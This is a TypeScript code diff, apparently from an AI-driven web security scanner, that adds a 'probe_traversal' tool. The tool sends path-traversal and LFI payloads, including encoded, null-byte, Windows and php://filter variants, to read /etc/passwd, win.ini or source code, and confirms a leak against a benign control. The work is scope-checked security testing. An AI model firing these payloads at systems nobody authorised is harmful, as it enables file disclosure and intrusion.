@@ -115,7 +115,7 @@ export interface PilotSession {
 export const STAGE_TOOLS = {
   survey: ["browser_navigate", "browser_fill", "browser_click", "login", "probe_paths", "ignore_paths", "survey_status", "survey_done"],
   methodology: ["get_inventory", "record_methodology", "methodology_done"],
-  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_cmdi", "probe_redirect", "probe_jwt", "probe_csrf", "probe_oob", "probe_logic", "analyze_session", "verify_access", "probe_idor", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done"],
+  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_cmdi", "probe_traversal", "probe_redirect", "probe_jwt", "probe_csrf", "probe_oob", "probe_logic", "analyze_session", "verify_access", "probe_idor", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done"],
   // シナリオ(A04 横断ロジック): inventory 俯瞰 + 多段リクエスト連鎖を probe_scenario で撃つ。画面診断の後に1回。
   scenario: ["get_inventory", "login", "http_request", "probe_scenario", "record_finding", "scenario_done"],
   // フィンガープリント(A06 既知脆弱コンポーネント): fingerprint_scan で版を集め、(opt-in で cve_lookup)既知 CVE を評価して記録。
@@ -1278,6 +1278,87 @@ export function buildTools(s: PilotSession) {
             }
           }
           return txt(JSON.stringify({ technique: null, verdict: "not confirmed: no product echo and no time delay across separator/substitution payloads. If a URL/host param, also try probe_oob (blind CMDi via a DNS/HTTP callback)." }));
+        } catch (e) {
+          return txt(`ERROR: ${String(e).slice(0, 180)}`);
+        }
+      },
+    ),
+    tool(
+      "probe_traversal",
+      "Confirm PATH TRAVERSAL / LFI: reads a file outside the intended directory through a file/path param (download/view/include/template/image/lang/file=). Inject via a {{PATH}} placeholder or `param`. Iterates a bypass corpus (../ traversal, ....// filter-defeat, URL/double-encoded, absolute path, null byte, Windows ..\\, and the PHP filter wrapper for source disclosure). Confirms via the impact oracle — the response carries real file content (/etc/passwd root:x:0:0, win.ini, or base64 source) that a benign control does not. Returns negativeControl + positiveReplays evidenceIds + the effectMarker → record_finding(category path-traversal).",
+      { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
+      async ({ url, param, method, body }) => {
+        const buildReq = (val: string): HttpRequest | null => {
+          let u = url;
+          let b: string | null = null;
+          if (body != null) b = body.replace(/\{\{PATH\}\}/g, val);
+          else if (param) {
+            try {
+              const uu = new URL(url);
+              uu.searchParams.set(param, val);
+              u = uu.toString();
+            } catch {
+              return null;
+            }
+          } else if (url.includes("{{PATH}}")) u = url.replace(/\{\{PATH\}\}/g, encodeURIComponent(val));
+          else return null;
+          if (!isInScope(u, s.scope)) return null;
+          return { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: authHeaders(s), body: b };
+        };
+        const rawSend = async (val: string): Promise<{ status: number; body: string } | null> => {
+          const req = buildReq(val);
+          if (!req) return null;
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          return { status: res.status, body: res.body };
+        };
+        const recordSend = async (val: string, kind: "negative_control" | "positive_replay", tag: string) => {
+          const req = buildReq(val)!;
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-traversal", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `traversal ${tag}` });
+          return { evId: ev.id, status: res.status, body: res.body };
+        };
+        const corpus = [
+          "../../../../../../etc/passwd",
+          "....//....//....//....//etc/passwd",
+          "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+          "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+          "/etc/passwd",
+          "../../../../../../etc/passwd%00",
+          "..\\..\\..\\..\\windows\\win.ini",
+          "php://filter/convert.base64-encode/resource=index.php",
+        ];
+        try {
+          const benign = await rawSend("index.html");
+          if (!benign) return txt("ERROR: bad url/param — pass a {{PATH}} placeholder or a param.");
+          for (const p of corpus) {
+            const r = await rawSend(p);
+            if (!r) continue;
+            const impact = impactOracle(r.body, { baselineBody: benign.body });
+            const fileHit = impact.find((i) => i.kind === "file-leak" || i.kind === "source-leak");
+            if (fileHit && r.status < 500) {
+              const ctrl = await recordSend("index.html", "negative_control", "benign(no traversal)");
+              const w1 = await recordSend(p, "positive_replay", `traversal #1 ${p}`);
+              const w2 = await recordSend(p, "positive_replay", `traversal #2 ${p}`);
+              const verdict = checkEvidenceDiscipline(
+                { status: ctrl.status, bodyLen: ctrl.body.length },
+                [w1, w2].map((x) => ({ status: x.status, bodyLen: x.body.length })),
+              );
+              return txt(
+                JSON.stringify({
+                  negativeControl: ctrl.evId,
+                  positiveReplays: [w1.evId, w2.evId],
+                  effectMarker: fileHit.marker,
+                  payload: p,
+                  verdict: verdict.ok
+                    ? `PATH TRAVERSAL / LFI CONFIRMED — payload "${p}" leaked ${fileHit.kind} (${fileHit.marker}); benign control did not. record_finding(category path-traversal) with these evidenceIds + effectMarker.`
+                    : `file content leaked but replay evidence weak: ${(verdict as { reason: string }).reason} — re-check stability.`,
+                }),
+              );
+            }
+          }
+          return txt(JSON.stringify({ verdict: "not confirmed: no file content leaked across ../, encoded, null-byte, Windows, or php-filter payloads. If the param is reflected into a template/include, also consider LFI-to-RCE via a log/wrapper, or probe_oob for a remote include." }));
         } catch (e) {
           return txt(`ERROR: ${String(e).slice(0, 180)}`);
         }
